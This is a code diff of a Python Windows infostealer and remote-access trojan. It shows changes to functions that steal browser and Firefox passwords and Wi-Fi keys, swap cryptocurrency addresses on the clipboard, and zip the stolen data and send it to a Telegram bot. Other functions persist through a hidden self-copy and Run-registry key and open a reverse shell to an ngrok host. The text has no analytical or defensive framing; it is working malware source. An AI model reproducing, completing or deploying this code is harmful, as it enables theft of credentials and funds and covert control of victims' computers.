@@ -27,25 +27,14 @@ import cv2
 # import nss
 import threading
 import ctypes
-import sys
 
 # === CONFIG ===
 BOT_TOKEN = "<<BOT_TOKEN>>"
 CHAT_ID = "<<CHAT_ID>>"
 NGROK_HOST = "4.tcp.eu.ngrok.io"
 NGROK_PORT = 17534
-EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")
-EXE_NAME = "system_service.exe"
-EXE_PATH = os.path.join(EXTRACT_FOLDER, EXE_NAME)
-EXFIL_MARKER = os.path.join(EXTRACT_FOLDER, ".exfil_done")
-
-# === MARKERS ===
-def already_exfiltrated():
-    return os.path.exists(EXFIL_MARKER)
-
-def mark_exfiltrated():
-    with open(EXFIL_MARKER, "w") as f:
-        f.write("done")
+EXTRACT_FOLDER = os.path.join(os.getenv("APPDATA"), ".sysdata")  # Hidden folder
+ARCHIVE_NAME = "exfil_data.zip"
 
 # === SYSTEM PROFILE ===
 def profile_system():
@@ -260,13 +249,13 @@ def steal_firefox_passwords():
             print(f"[!] Firefox decrypt error: {e}")
 
 # === CLIPPER ===
+def clipper_loop():
+    while True:
+        clipper()
+        time.sleep(1.5)
+
 CLIP_WALLETS = {
-    "BTC": "bc1xxx",
-    "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e",
-    "XRP": "rxyz",
-    "LTC": "ltc1xyz",
-    "BCH": "qxyxyxy",
-    "XMR": "4xxxxx"
+    "BTC": "bc1xxx", "ETH": "0x9e6b499df50c4d9fe9b1622b2c2a17e156c9963e", "XRP": "rxyz", "LTC": "ltc1xyz", "BCH": "qxyxyxy", "XMR": "4xxxxx"
 }
 CLIP_PATTERNS = {
     "BTC": r"(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}",
@@ -276,82 +265,47 @@ CLIP_PATTERNS = {
     "BCH": r"(bitcoincash:)?(q|p)[a-z0-9]{41}",
     "XMR": r"4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}"
 }
-
 def clipper():
     try:
         win32clipboard.OpenClipboard()
         data = win32clipboard.GetClipboardData()
         win32clipboard.CloseClipboard()
-
         for coin, pattern in CLIP_PATTERNS.items():
-            if re.fullmatch(pattern, data.strip()):
+            if re.search(pattern, data):
                 win32clipboard.OpenClipboard()
                 win32clipboard.EmptyClipboard()
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
-                break
-    except:
-        pass
-
-def clipper_loop():
-    while True:
-        clipper()
-        time.sleep(1.5)
-    
-import datetime
-
+    except: pass
 
 # === ZIP & TELEGRAM ===
 def send_zip_to_telegram():
+    zip_name = f"{getpass.getuser()}_exfil_data"
+    shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
     try:
-        zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
-        zip_path = f"{zip_name}.zip"
-
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for root, dirs, files in os.walk(EXTRACT_FOLDER):
-                for file in files:
-                    if file == "system_service.exe":
-                        continue  # ❌ Skip the EXE
-                    file_path = os.path.join(root, file)
-                    arcname = os.path.relpath(file_path, EXTRACT_FOLDER)
-                    zipf.write(file_path, arcname)
-
-        with open(zip_path, "rb") as f:
+        with open(f"{zip_name}.zip", "rb") as f:
             requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                 data={"chat_id": CHAT_ID},
-                files={"document": (os.path.basename(zip_path), f)}
+                files={"document": (f"{zip_name}.zip", f)}
             )
-
-        os.remove(zip_path)
-
+        os.remove(f"{zip_name}.zip")
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "telegram_error.txt"), "w") as errlog:
-            errlog.write(str(e))
+        print(f"[!] Telegram send failed: {e}")
 
-
-
-# === PERSISTENCE ===
 # === PERSISTENCE ===
 def persist():
     try:
-        # Skip self-copy logic entirely
-
-        # Just ensure registry persistence using current path
-        current_path = os.path.abspath(sys.argv[0])
-        reg_key = winreg.OpenKey(
-            winreg.HKEY_CURRENT_USER,
-            r"Software\Microsoft\Windows\CurrentVersion\Run",
-            0, winreg.KEY_SET_VALUE
-        )
-        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, current_path)
-        winreg.CloseKey(reg_key)
-
-    except Exception as e:
-        print(f"[!] Persistence error: {e}")
-
-
-
+        path = os.path.abspath(__file__)
+        dest_path = os.path.join(EXTRACT_FOLDER, os.path.basename(path))
+        if not os.path.exists(dest_path):
+            shutil.copy2(path, dest_path)
+            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
+        winreg.CloseKey(key)
+    except: pass
 
 def fake_input():
     for _ in range(3):
@@ -378,45 +332,39 @@ def reverse_shell():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(10)  # ← Timeout to prevent hanging on recv
             s.connect((NGROK_HOST, NGROK_PORT))
+            
 
             def send_data(data):
                 if not isinstance(data, bytes):
                     data = data.encode()
-                try:
-                    s.send(data + b"\n")
-                except:
-                    raise ConnectionError
+                s.send(data + b"\n")
 
             def get_system_info():
                 info = f"""
-OS         : {platform.system()} {platform.version()}
-Machine    : {platform.machine()}
-Processor  : {platform.processor()}
-Username   : {getpass.getuser()}
-Hostname   : {socket.gethostname()}
-IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
-RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
-"""
+    OS         : {platform.system()} {platform.version()}
+    Machine    : {platform.machine()}
+    Processor  : {platform.processor()}
+    Username   : {getpass.getuser()}
+    Hostname   : {socket.gethostname()}
+    IP (LAN)   : {socket.gethostbyname(socket.gethostname())}
+    RAM        : {round(psutil.virtual_memory().total / (1024**3), 2)} GB
+    """
                 return info
 
             def show_help():
                 return """Available Commands:
-    help                - Show this menu
-    info                - System info
-    wifi                - Dump saved Wi-Fi SSIDs + passwords
-    screenshot          - Capture screen & send
-    download <file>     - Download a file
-    upload <file>       - Upload a file
-    cd <dir>            - Change working directory
-    exit / quit         - Close shell"""
+        help                - Show this menu
+        info                - System info
+        wifi                - Dump saved Wi-Fi SSIDs + passwords
+        screenshot          - Capture screen & send
+        download <file>     - Download a file
+        upload <file>       - Upload a file
+        cd <dir>            - Change working directory
+        exit / quit         - Close shell"""
 
             while True:
-                try:
-                    cmd = s.recv(1024).decode("utf-8").strip()
-                except socket.timeout:
-                    continue  # Just try again
+                cmd = s.recv(1024).decode("utf-8").strip()
 
                 if not cmd:
                     continue
@@ -544,21 +492,18 @@ def run():
     launch_distraction_app()
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-
-    if not already_exfiltrated():
-        profile_system()
-        take_screenshot()
-        if check_webcam():
-            with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
-                f.write("Webcam detected.")
-        extract_wifi()
-        detect_vm()
-        kill_taskmgr()
-        clipper()
-        steal_browser()
-        steal_firefox_passwords()
-        send_zip_to_telegram()
-        mark_exfiltrated()
+    profile_system()
+    take_screenshot()
+    if check_webcam():
+        with open(os.path.join(EXTRACT_FOLDER, "webcam.txt"), "w") as f:
+            f.write("Webcam detected.")
+    extract_wifi()
+    detect_vm()
+    kill_taskmgr()
+    clipper()
+    steal_browser()
+    steal_firefox_passwords()
+    send_zip_to_telegram()
     persist()
     fake_input()
     while True:
